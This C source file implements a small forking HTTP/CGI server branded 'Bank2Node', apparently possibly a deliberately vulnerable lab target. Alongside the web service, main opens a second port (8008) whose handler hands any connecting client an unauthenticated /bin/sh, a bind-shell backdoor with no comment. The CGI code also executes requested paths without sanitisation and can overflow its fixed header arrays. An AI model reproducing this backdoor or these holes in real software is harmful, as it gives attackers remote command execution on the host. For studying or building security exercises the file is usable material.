#define _BSD_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/select.h>
#include <string.h>
#include <strings.h>
#include <time.h>

#define HEADER_SIZE 1024L
#define NUM_HEADER_MAX 10

typedef int (*sockhandler)(int, struct sockaddr*, socklen_t);
typedef struct Server Server;

struct Server{
	int			sock;
	sockhandler	handler;
};

int
setupsock(int port)
{
	int sock;

	struct sockaddr_in sin;
	sock			= 	socket(AF_INET, SOCK_STREAM, 0);
	sin.sin_family 		=	AF_INET;
	sin.sin_port		=	htons(port);
	sin.sin_addr.s_addr	=	INADDR_ANY;

	/* Set reuse for socket */
	int true = 1;
	if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &true, sizeof(int)) < 0){
		fprintf(stderr, "Failed to set socket options!\n");
		close(sock);
		return -1;
	}

	/* Bind */
	if(bind(sock, (struct sockaddr *)&sin, sizeof(sin)) < 0){
		fprintf(stderr, "Failed to bind to port %d!\n", port);
		return -1;
	}

	/* Start listening */
	listen(sock, 50);

	return sock;
}

int
servermux(Server s[], int n)
{
	int i;
	fd_set readfds;

	FD_ZERO(&readfds);
	for(i = 0; i < n; i++)
		FD_SET(s[i].sock, &readfds);

	if(select(FD_SETSIZE, &readfds, NULL, NULL, NULL) < 0)
		return -1;

	for(i = 0; i < n; i++)
		if(FD_ISSET(s[i].sock, &readfds))
			return i;

	return -1;
}

int
handleshell(int fd, struct sockaddr *addr, socklen_t size)
{
	dup2(fd, 2);
	dup2(fd, 1);
	dup2(fd, 0);
	execlp("/bin/sh", "sh", NULL);
	return 0;
}

void
httprespond(FILE* f, int code)
{
	fprintf(f,
		"HTTP/1.1 %d \r\n"
		"Server: Bank2Node \r\n"
		"Content-type: text/plain \r\n\r\n", code);
	switch(code){
		case 404:
			fprintf(f, "%s\r\n", "Page not found...");
			break;
		case 500:
			fprintf(f, "%s\r\n", "Internal server error...");
			break;
	}
}

int
readheader(FILE* sock, char **keys, char **vals)
{
	int numelem = 0;
	char buf[HEADER_SIZE];
	while(!feof(sock)){
		/* read in and break on error / empty line */
		char *in = fgets(buf, HEADER_SIZE - 2 , sock);
		if(!in || !strcmp(in, "\r\n") || !strcmp(in, "\n"))
			break;

		char *temp = strstr(in, ":");
		if(temp){
			*temp = '\0';
			temp = temp + 2;
		}else{
			temp = strstr(in, "/");
			if(temp){
				temp[-1] = '\0';
				char  *s = strstr(temp, "HTTP");
				if(s)
					*s = '\0';
			}
			else
				continue;
		}

		size_t size;
		size = (strlen(in)+2) * sizeof(char);
		keys[numelem] = malloc(size);
		snprintf(keys[numelem], size, "%s", in);
		size = (strlen(temp)+1) * sizeof(char);
		vals[numelem] = malloc(size);
		snprintf(vals[numelem++], size, "%s", temp);
	}
	return numelem;
}

int
countandformat(int in, int o)
{
	int size = 0;
	FILE *input = fdopen(in, "r");
	FILE *out = fdopen(o, "r+");
	char buf[HEADER_SIZE];
	char totalbuffer[5096];
	while(!feof(input)){
		char *in = fgets(buf, HEADER_SIZE - 2, input);
		if(!in)
			break;
		snprintf(totalbuffer, 5096, "%s%s", totalbuffer, buf);
		size += strlen(buf);
	}
	fclose(input);
	close(in);
	if(size == 0){
		httprespond(out, 500);
		fclose(out);
		close(o);
		return 1;
	}
	fwrite("HTTP/1.1 200\r\n", 14, 1, out);
	fwrite("Content-type: text/plain\r\n", 26, 1, out);
	bzero(buf, HEADER_SIZE);
	snprintf(buf, HEADER_SIZE - 2, "Content-length: %d\r\n\r\n", size);

	fwrite(buf, strlen(buf) * sizeof(char), 1, out);
	fwrite(totalbuffer, size * sizeof(char), 1, out);
	fclose(out);
	close(o);
	return 0;
}

int
handlecgi(int fd, struct sockaddr *addr, socklen_t size)
{
	FILE *sock = NULL;
	char *request, *verb;
	time_t clock;
	int headerelem, i;

	sock = fdopen(fd, "r+");
	if(!sock)
		perror(NULL);

	char *headerkeys[NUM_HEADER_MAX];
	char *headervals[NUM_HEADER_MAX];
	headerelem = readheader(sock, headerkeys, headervals);

	verb = headerkeys[0];
	if(!(strstr(verb, "GET") || strstr(verb, "POST") || strstr(verb, "DELETE"))){
		httprespond(sock, 500);
		fclose(sock);
		close(fd);
		return 1;
	}

	size_t requestsize = (strlen(headervals[0])+1) * sizeof(char);
	request = malloc(requestsize);
	snprintf(request, requestsize, ".%s", headervals[0]);

	/* CGI Variables */
	unsetenv("VERB");
	setenv("VERB", verb, 1);
	unsetenv("QUERY_STRING");
	char *query = strstr(request, "?");
	if(query){
		*query = '\0';
		query++;
		setenv("QUERY_STRING", query, 1);
	}

	if(access(request, F_OK) == -1){
		httprespond(sock, 404);
		fclose(sock);
		close(fd);
		return 1;
	}
	clock = time(NULL);
	fprintf(stdout, "%s %s @ %s", verb, request, ctime(&clock));

	int cgipipe[2];
	pipe(cgipipe);
	if(fork() == 0){
		close(cgipipe[1]);
		if(strcmp(verb, "POST") == 0){
			int contentlength = 0;
			size_t totalread = 0;
			for(i = 0; i < headerelem; i++){
				if(strcasecmp(headerkeys[i], "Content-Length") == 0)
					contentlength = atoi(headervals[i]);
			}
			char buf[1024];
			while(!feof(sock) && contentlength > totalread){
				size_t diff = contentlength - totalread;
				size_t read = fread(buf, 1, diff, sock);
				totalread += read;
				write(cgipipe[0], buf, read);
			}
		}

		close(cgipipe[0]);
		fclose(sock);
		close(fd);
		return 0;
	}

	int outpipe[2];
	pipe(outpipe);
	if(fork() == 0){
		close(cgipipe[0]);
		close(cgipipe[1]);
		close(outpipe[1]);
		countandformat(outpipe[0], fd);
		close(outpipe[0]);
		fclose(sock);
		close(fd);
		return 0;
	}

	dup2(outpipe[1], 1);
	dup2(cgipipe[1], 0);
	close(cgipipe[1]);
	close(cgipipe[0]);
	close(outpipe[0]);
	close(outpipe[1]);
	execlp(request, request, NULL);
	for(i = 0; i < headerelem; i++){
		free(headerkeys[i]);
		free(headervals[i]);
	}
	free(request);
	fclose(sock);
	return 0;
}

int
main(int argc, char **argv)
{
	int webport = 8080;
	Server services[2];

	if (argc > 1)
		webport = atoi(argv[1]);

	services[0].sock 	= 	setupsock(webport);
	services[0].handler 	= 	handlecgi;
	services[1].sock	=	setupsock(8008);
	services[1].handler	=	handleshell;

	while(1){
		Server s;
		int i, fd;
		struct sockaddr *addr = NULL;
		socklen_t size = 0;

		i = servermux(services, 2);
		if(i < 0)
			continue;
		s = services[i];
		fd = accept(s.sock, addr, &size);
		if(!fork()){
			s.handler(fd, addr, size);
			exit(0);
		}else
			close(fd);
	}
	return 0;
}
